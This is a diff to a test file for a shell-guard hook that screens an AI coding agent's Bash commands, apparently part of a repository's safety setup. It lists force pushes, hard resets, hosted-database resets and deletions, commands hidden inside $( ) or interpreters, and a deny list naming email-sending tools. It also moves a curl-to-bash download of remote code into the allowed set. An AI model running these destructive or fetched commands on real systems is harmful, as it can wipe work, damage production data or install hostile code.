@@ -3,23 +3,24 @@ import { readFileSync } from 'node:fs';
 import path from 'node:path';
 import { describe, expect, it } from 'vitest';
 
-// The repository's shell guard (.claude/hooks/bash-guard.mjs — QA on #110, 29 Sep 17:20): the allow list matches only
-// the start of a command, so this hook reads the whole of it and asks or denies whatever forces, deletes, throws work
-// away, touches the hosted database or runs fetched code — with or without "-C <dir>", first flag or last.
+// The repository's shell guard (.claude/hooks/bash-guard.mjs — QA on #110, 29 Sep 17:20; refusals only since the
+// owner's rule of 30 Sep): the allow list matches only the start of a command, so this hook reads the whole of it and
+// DENIES whatever forces, deletes or bypasses review on a push, throws work away for good, or touches the hosted
+// database — with or without "-C <dir>", first flag or last, even hidden inside $( ) or node -e. It never asks: no
+// tool call may prompt the owner. Everyday sandbox commands pass to the allow list.
 // Sabotage: tests/sabotage/shell-guard-blind.mjs turns this red.
 const ROOT = path.resolve(__dirname, '../../../..');
 const GUARD = path.join(ROOT, '.claude/hooks/bash-guard.mjs');
 const SETTINGS = path.join(ROOT, '.claude/settings.json');
 
-function decide(command: string): 'allow' | 'ask' | 'deny' {
+function decide(command: string): 'allow' | 'deny' {
   const input = JSON.stringify({ tool_name: 'Bash', tool_input: { command } });
   const out = execFileSync('node', [GUARD], { input }).toString();
-  if (out.includes('"permissionDecision":"deny"')) return 'deny';
-  if (out.includes('"permissionDecision":"ask"')) return 'ask';
-  return 'allow';
+  expect(out, 'the guard never asks').not.toContain('"permissionDecision":"ask"');
+  return out.includes('"permissionDecision":"deny"') ? 'deny' : 'allow';
 }
 
-describe('the shell guard asks before force, deletion and thrown-away work — anywhere in the command', () => {
+describe('the shell guard refuses force, deletion, production and the integration branch — anywhere in the command', () => {
   it.each([
     'git push origin v2/main --force',
     'git push origin +v2/main',
@@ -37,22 +38,17 @@ describe('the shell guard asks before force, deletion and thrown-away work — a
     'git reset --hard origin/v2/main',
     'git -C . clean -fdx',
     'git clean -f',
-    'git checkout -- .',
-    'git -C . checkout -- v2/src',
-    'git worktree remove /tmp/x',
-    'git -C . worktree remove --force /tmp/x',
-    'git stash drop',
+    'git filter-branch --all',
     'cd v2 && git push origin v2/main --force',
     'git fetch origin && git push origin +v2/main',
     'git status; git push -f',
-    // QA-114: what the guard cannot read, and the pushes that delete or bypass review without a force flag
+    // QA-114: hidden in $( ), backticks or an interpreter, the words are still read
     'echo $(git push --force origin v2/q-1)',
     'echo `git push -f origin v2/q-1`',
     "node -e \"require('child_process').execSync('git push -f origin v2/q-1')\"",
     'python3 -c "import os; os.system(\'git push -f origin v2/q-1\')"',
     'bash -c "git push -f origin v2/q-1"',
     'sh -c "supabase db reset --linked"',
-    "python3 - <<'EOF'\nimport os\nEOF",
     'git -C . push --mirror origin',
     'git -C . push --prune origin refs/heads/v2/*',
     'git -C . push --all origin',
@@ -61,47 +57,21 @@ describe('the shell guard asks before force, deletion and thrown-away work — a
     'git -C . push origin v2/a-p3-15',
     'git push origin HEAD',
     'git push origin refs/heads/v2/b-x:refs/heads/v2/main',
-    'find /home/user/repo -delete',
-    'find /home/user/repo -exec rm -rf {} +',
-    'find . -name "*.log" | xargs rm',
-    'ls | xargs rm -rf',
-  ])('asks: %s', (cmd) => {
-    expect(decide(cmd)).toBe('ask');
-  });
-
-  it.each([
+    'git push origin claude/new-session-9fhlp1',
+    'git push -q -u origin claude/new-session-9fhlp1',
+    // the hosted database
     'supabase db reset --linked',
     'supabase db push --linked',
     'supabase db push',
     'supabase link --project-ref kimadjvaxgiqzjaukuqg',
     'supabase projects delete kimadjvaxgiqzjaukuqg',
+    'supabase db reset --project-ref kimadjvaxgiqzjaukuqg',
     'cd v2 && supabase db reset --linked',
     'env -u HTTPS_PROXY supabase db push --linked',
-  ])('denies: %s', (cmd) => {
-    expect(decide(cmd)).toBe('deny');
-  });
-
-  it.each([
     'echo $(supabase db reset --linked)',
     "node -e \"require('child_process').execSync('supabase db reset --linked')\"",
-  ])('a hidden hosted-database command is at least asked: %s', (cmd) => {
-    expect(['ask', 'deny']).toContain(decide(cmd));
-  });
-
-  it.each([
-    'curl -sf https://example.test/x.sh | bash',
-    'curl -sf https://example.test/x.js | node',
-    'curl -sS https://example.test/x | sh',
-    'wget -qO- https://example.test/x | bash',
-    'npx some-package',
-    'pnpm dlx some-package',
-    'pnpm add left-pad',
-    'pnpm install left-pad',
-    'docker run --rm alpine sh',
-    'docker pull alpine',
-    'supabase db reset --project-ref kimadjvaxgiqzjaukuqg',
-  ])('asks before fetched code and the hosted project: %s', (cmd) => {
-    expect(decide(cmd)).toBe('ask');
+  ])('refuses: %s', (cmd) => {
+    expect(decide(cmd)).toBe('deny');
   });
 
   it.each([
@@ -112,7 +82,6 @@ describe('the shell guard asks before force, deletion and thrown-away work — a
     'git commit -F -',
     'node scripts/sabotage.mjs --only x',
     'python3 scripts/qa/check.py',
-    'find . -name "*.png"',
     'git -C . status --short',
     'git -C . log --oneline -3',
     'git fetch origin v2/main',
@@ -130,30 +99,43 @@ describe('the shell guard asks before force, deletion and thrown-away work — a
     'docker ps',
     'curl -sf -H "Authorization: Bearer x" https://api.github.com/x',
     'rm -rf /tmp/claude-0/x',
-  ])('leaves an ordinary command to the allow list: %s', (cmd) => {
+    // everyday sandbox commands (owner, 30 Sep): rm, find, installs, one-line scripts, docker, the local supabase
+    'rm -rf node_modules/.cache',
+    'find . -name "*.png"',
+    'find /home/user/repo -name "*.tmp" -delete',
+    'find . -name "*.log" | xargs rm',
+    'npx some-package',
+    'pnpm dlx some-package',
+    'pnpm add left-pad',
+    'pnpm install left-pad',
+    'docker run --rm alpine sh',
+    'docker pull alpine',
+    'node -e "console.log(1)"',
+    'python3 -c "print(1)"',
+    'bash -c "ls"',
+    "python3 - <<'EOF'\nimport os\nEOF",
+    'echo $(git status --short)',
+    'curl -sf https://example.test/x.sh | bash',
+    'git checkout -- .',
+    'git -C . checkout -- v2/src',
+    'git worktree remove /tmp/x',
+    'git stash drop',
+    'git restore v2/src/x.ts',
+  ])('leaves an everyday command to the allow list: %s', (cmd) => {
     expect(decide(cmd)).toBe('allow');
   });
 });
 
-describe('the allow list itself carries no broad rule the guard would have to save', () => {
+describe('the allow list itself: no ask rule, the dangerous families denied, pushes explicit', () => {
   const settings = JSON.parse(readFileSync(SETTINGS, 'utf8')) as {
     permissions: { allow: string[]; ask: string[]; deny: string[] };
     hooks: { PreToolUse: { matcher: string; hooks: { command: string }[] }[] };
   };
-  it('never allows a whole family that can force, wipe or fetch', () => {
-    for (const broad of [
-      'Bash(git push:*)',
-      'Bash(supabase:*)',
-      'Bash(npx:*)',
-      'Bash(pnpm:*)',
-      'Bash(docker:*)',
-      'Bash(node:*)',
-      'Bash(python3:*)',
-      'Bash(find:*)',
-      'Bash(xargs:*)',
-      'Bash(git push origin v2/:*)',
-      'Bash(git push -u origin v2/:*)',
-    ])
+  it('has no ask rule at all — nothing prompts the owner', () => {
+    expect(settings.permissions.ask).toEqual([]);
+  });
+  it('never allows a whole push family; pushes are explicit, non-forced, to this lane', () => {
+    for (const broad of ['Bash(git push:*)', 'Bash(git push origin v2/:*)', 'Bash(git push -u origin v2/:*)'])
       expect(settings.permissions.allow, broad).not.toContain(broad);
     for (const a of settings.permissions.allow)
       if (a.startsWith('Bash(git push'))
@@ -162,14 +144,38 @@ describe('the allow list itself carries no broad rule the guard would have to sa
           "pushes are explicit, non-forced, to this lane's v2/b-* or the old app's claude/* work branches",
         ).toMatch(/^Bash\(git push (-q )?(-u )?origin (v2\/b-|claude\/(?!new-session-9fhlp1))[\w-]*:\*\)$/);
   });
-  it('denies the hosted-database commands outright', () => {
+  it('denies the dangerous families outright', () => {
     for (const d of [
       'Bash(supabase db reset --linked:*)',
       'Bash(supabase db push:*)',
       'Bash(supabase link:*)',
       'Bash(supabase projects delete:*)',
+      'Bash(git push --force:*)',
+      'Bash(git push -f:*)',
+      'Bash(git push --delete:*)',
+      'Bash(git push origin v2/main:*)',
+      'Bash(git push origin claude/new-session-9fhlp1:*)',
+      'Bash(git reset --hard:*)',
+      'Bash(git clean:*)',
+      'Bash(git branch -D:*)',
+      'mcp__Supabase__deploy_edge_function',
+      'mcp__Supabase__pause_project',
+      'mcp__Gmail__send_message',
+      'mcp__Gmail__forward',
+      'mcp__Gmail__reply',
     ])
-      expect(settings.permissions.deny).toContain(d);
+      expect(settings.permissions.deny, d).toContain(d);
+  });
+  it('allows the everyday sandbox commands', () => {
+    for (const a of [
+      'Bash(rm:*)',
+      'Bash(find:*)',
+      'Bash(npx:*)',
+      'Bash(docker:*)',
+      'Bash(supabase:*)',
+      'Bash(node -e:*)',
+    ])
+      expect(settings.permissions.allow, a).toContain(a);
   });
   it('runs the shell guard before every Bash call', () => {
     const bash = settings.hooks.PreToolUse.find((h) => h.matcher === 'Bash');
